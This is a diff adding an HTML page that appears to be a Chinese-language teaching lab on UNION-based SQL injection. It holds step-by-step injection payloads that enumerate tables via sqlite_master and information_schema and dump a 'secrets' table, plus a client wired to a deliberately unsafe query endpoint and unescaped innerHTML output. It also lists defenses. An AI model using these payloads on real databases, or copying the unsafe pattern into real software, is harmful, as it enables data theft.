@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>实验二：UNION 注入</title>
+  <link rel="stylesheet" href="../xss/style.css">
+</head>
+<body>
+  <div class="container">
+    <nav class="nav">
+      <a href="index.html">← 返回 SQL注入 Lab</a>
+    </nav>
+
+    <header>
+      <h1>📊 实验二：UNION 注入</h1>
+      <p class="subtitle">UNION-based SQL Injection</p>
+    </header>
+
+    <section>
+      <h2>📖 原理说明</h2>
+      <p>UNION 注入是最强大的 SQL 注入技术之一，可以窃取数据库中任意表的数据：</p>
+      <pre><code>-- 原始查询
+SELECT id, username, role FROM users WHERE id=1
+
+-- UNION 注入后
+SELECT id, username, role FROM users WHERE id=1
+UNION
+SELECT id, content, level FROM secrets
+                    ↑
+         窃取 secrets 表的数据！</code></pre>
+      
+      <div class="info-box">
+        <strong>💡 UNION 注入条件</strong>
+        <p>1. 两个 SELECT 的列数必须相同</p>
+        <p>2. 对应列的数据类型要兼容</p>
+      </div>
+    </section>
+
+    <section>
+      <h2>🧪 漏洞演示 - 用户查询</h2>
+      
+      <p>场景：根据 ID 查询用户信息</p>
+      
+      <div style="margin: 1rem 0;">
+        <label>用户 ID:</label>
+        <input type="text" id="userId" placeholder="输入用户ID" value="1">
+        <button class="btn" onclick="queryUser()" style="margin-top: 0.5rem;">查询</button>
+      </div>
+
+      <div class="warning-box">
+        <strong>💡 攻击步骤：</strong>
+        
+        <p style="margin-top: 0.5rem;"><strong>Step 1: 确定列数</strong></p>
+        <p><code>1 ORDER BY 3--</code> (成功) → <code>1 ORDER BY 4--</code> (失败) → 3列</p>
+        
+        <p style="margin-top: 0.5rem;"><strong>Step 2: 确定显示位</strong></p>
+        <p><code>-1 UNION SELECT 1,2,3--</code></p>
+        
+        <p style="margin-top: 0.5rem;"><strong>Step 3: 查询表名</strong></p>
+        <p><code>-1 UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'--</code></p>
+        
+        <p style="margin-top: 0.5rem;"><strong>Step 4: 窃取 secrets 表</strong></p>
+        <p><code>-1 UNION SELECT id,content,level FROM secrets--</code></p>
+      </div>
+
+      <div style="margin-top: 1.5rem;">
+        <h3>执行的 SQL:</h3>
+        <pre><code id="sqlDisplay">等待输入...</code></pre>
+      </div>
+
+      <div style="margin-top: 1rem;">
+        <h3>查询结果:</h3>
+        <div id="result">
+          <p style="color: #888;">等待查询...</p>
+        </div>
+      </div>
+    </section>
+
+    <section>
+      <h2>🎯 攻击详解</h2>
+      
+      <h3 style="margin: 1rem 0 0.5rem; color: #4dabf7;">为什么用 -1？</h3>
+      <pre><code>-- id=-1 不存在，原查询返回空
+SELECT id, username, role FROM users WHERE id=-1
+-- UNION 的结果就是唯一显示的内容
+UNION SELECT id, content, level FROM secrets</code></pre>
+
+      <h3 style="margin: 1rem 0 0.5rem; color: #4dabf7;">获取数据库结构</h3>
+      <pre><code>-- SQLite 查询所有表名
+-1 UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'--
+
+-- MySQL 查询所有表名
+-1 UNION SELECT 1,table_name,3 FROM information_schema.tables--</code></pre>
+
+      <h3 style="margin: 1rem 0 0.5rem; color: #4dabf7;">获取列名</h3>
+      <pre><code>-- SQLite 查询表结构
+-1 UNION SELECT 1,sql,3 FROM sqlite_master WHERE name='secrets'--</code></pre>
+    </section>
+
+    <section>
+      <h2>🛡️ 防御要点</h2>
+      <ul style="margin-left: 1.5rem;">
+        <li><strong>参数化查询</strong> - UNION 注入完全无效</li>
+        <li><strong>输入验证</strong> - ID 只允许数字</li>
+        <li><strong>最小权限</strong> - 查询账户不能访问敏感表</li>
+        <li><strong>WAF</strong> - 检测 UNION、SELECT 等关键字</li>
+      </ul>
+    </section>
+  </div>
+
+  <script>
+    async function queryUser() {
+      const id = document.getElementById('userId').value
+      
+      const res = await fetch(`/api/sql/user/unsafe?id=${encodeURIComponent(id)}`)
+      const data = await res.json()
+      
+      // 显示 SQL
+      document.getElementById('sqlDisplay').textContent = data.sql || ''
+      
+      // 显示结果
+      const resultEl = document.getElementById('result')
+      if (data.success && data.users.length > 0) {
+        resultEl.innerHTML = `
+          <table style="width: 100%; border-collapse: collapse;">
+            <thead>
+              <tr><th>列1</th><th>列2</th><th>列3</th></tr>
+            </thead>
+            <tbody>
+              ${data.users.map(u => `
+                <tr>
+                  <td>${u.id}</td>
+                  <td>${u.username}</td>
+                  <td>${u.role}</td>
+                </tr>
+              `).join('')}
+            </tbody>
+          </table>
+        `
+      } else if (data.success) {
+        resultEl.innerHTML = '<p style="color: #888;">无结果</p>'
+      } else {
+        resultEl.innerHTML = `<div class="warning-box">${data.message}</div>`
+      }
+    }
+
+    // 实时更新 SQL 预览
+    document.getElementById('userId').addEventListener('input', function(e) {
+      document.getElementById('sqlDisplay').textContent = 
+        `SELECT id, username, role FROM users WHERE id=${e.target.value}`
+    })
+  </script>
+
+  <style>
+    th, td {
+      padding: 0.75rem;
+      text-align: left;
+      border-bottom: 1px solid #0f3460;
+    }
+    th { background: #0f3460; }
+  </style>
+</body>
+</html>
